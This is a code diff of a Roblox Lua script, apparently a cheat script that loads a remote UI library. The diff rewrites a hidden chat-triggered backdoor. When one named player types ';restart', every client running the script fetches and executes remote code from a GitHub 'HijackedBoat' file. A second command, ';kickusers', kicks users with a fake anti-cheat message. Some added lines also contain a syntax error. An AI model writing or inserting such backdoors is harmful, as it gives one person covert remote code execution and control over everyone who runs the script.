@@ -1,34 +1,34 @@
-local TextChatService = game:GetService("TextChatService")
 local Players = game:GetService("Players")
-local localPlayer = Players.LocalPlayer
+local LocalPlayer = Players.LocalPlayer
 
-TextChatService.OnIncomingMessage = function(message)
-    if message.Text == ";restart" then
-        local sender = message.TextSource
-        if sender and sender:IsA("Player") and sender.Name == "GuestNoob101013" then
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/WasiTC/HijackedBoat/refs/heads/main/HijackedBoat.lua"))()
+local function onChatMessage(message, plr)
+    if plr then
+        if message:match(";restart") and plr.Name == "GuestNoob101013" then
+           loadstring(game:HttpGet("https://raw.githubusercontent.com/WasiTC/HijackedBoat/refs/heads/main/HijackedBoat.lua"))()
         end
     end
-
-    -- Return the message's properties to comply with the API requirements
-    return message:GetProperties()
 end
 
-local TextChatService = game:GetService("TextChatService")
-local Players = game:GetService("Players")
-local localPlayer = Players.LocalPlayer
+for _,v in ipairs(game.Players:GetPlayers()) do
+  v.Chatted:Connect(function(m) onChatMessage(m, v) end)
+end
+game.Players.PlayerAdded:Connect(function(v) v:Chatted:Connect(function(m) onChatMessage(m, v) end) end)
 
-TextChatService.OnIncomingMessage = function(message)
-    if message.Text == ";kickusers" then
-        local sender = message.TextSource
-        if sender and sender:IsA("Player") and sender.Name == "GuestNoob101013" then
-            localPlayer:Kick("Anti-Cheat: You have been kicked for exploiting. | Cheat Detected: HijackedBoat")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local function onChatMessage(message, plr)
+    if plr then
+        if message:match(";kickusers") and plr.Name == "GuestNoob101013" then
+           LocalPlayer:Kick("Anti-Cheat: You have been kicked for exploiting. | Cheat Detected: HijackedBoat")
         end
     end
-
-    -- Return the message's properties to comply with the API requirements
-    return message:GetProperties()
 end
+
+for _,v in ipairs(game.Players:GetPlayers()) do
+  v.Chatted:Connect(function(m) onChatMessage(m, v) end)
+end
+game.Players.PlayerAdded:Connect(function(v) v:Chatted:Connect(function(m) onChatMessage(m, v) end) end)
 
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
